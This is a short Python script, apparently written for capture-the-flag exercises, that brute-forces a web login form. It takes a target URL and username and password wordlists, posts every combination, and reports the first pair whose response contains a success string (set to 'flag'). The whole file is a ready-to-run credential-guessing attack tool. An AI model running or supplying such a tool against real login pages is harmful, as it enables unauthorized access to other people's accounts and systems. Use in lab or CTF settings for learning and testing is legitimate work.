from pwn import *
import requests
import sys

if len(sys.argv) != 4:
	print("Invalid number of arguments!")
	print(f">> {sys.argv[0]} <target ip> <username list> <password list>")
	exit()

target = sys.argv[1]
username_file = sys.argv[2]
password_file = sys.argv[3]
needle = "flag" # Change this depending on the login form.

with open(username_file, 'r', encoding='latin-1') as username_list:
	for username in username_list:
		username = username.strip("\n").encode()
		with open(password_file, 'r', encoding='latin-1') as password_list:
			for password in password_list:
				password = password.strip("\n").encode()
				sys.stdout.write(f"\r[X] Attempting credentials {username.decode()}:{password.decode()}         ")
				sys.stdout.flush()
				r = requests.post(target, data={"username": username, "password": password})
				if needle.encode() in r.content: # Change to not in if you want to test based off fail condition.
					sys.stdout.write("\n")
					sys.stdout.write(f"[>>>] Valid credentials found: {username.decode('utf-8')}:{password.decode('utf-8')}")
					sys.exit()
			sys.stdout.flush()
			sys.stdout.write("\n")
			sys.stdout.write(f"[-] No valid credentials found for {username.decode('utf-8')}\n")
